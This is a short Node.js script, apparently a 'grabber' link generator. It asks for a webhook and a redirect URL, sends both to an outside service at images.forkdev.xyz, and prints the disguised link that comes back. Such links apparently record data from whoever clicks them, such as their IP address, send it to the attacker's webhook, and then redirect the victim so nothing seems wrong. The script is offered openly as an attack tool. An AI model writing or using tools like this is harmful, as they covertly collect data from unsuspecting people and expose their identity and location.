const fetch = require("node-fetch-commonjs")
const prompt = require("prompt")
prompt.start({ message: "\x1b[34mGrabber" })

const settings = [
    {
        name: "webhook",
        description: "Webhook",
        required: true
    },
    {
        name: "redirect",
        description: "Redirect",
        required: true
    }
]

prompt.get(settings, (err, result) => generateLink(result.webhook, result.redirect))

async function generateLink(webhook, redirect) {
    const response = await (await fetch(`https://images.forkdev.xyz/generate?webhook=${webhook}&redirect=${redirect}`)).json()

    if (response.error) console.log("Error occured! " + response.error)
    else if (response.url) console.log("Generated link: " + response.url)
    else console.log("Unknown error occured!")
}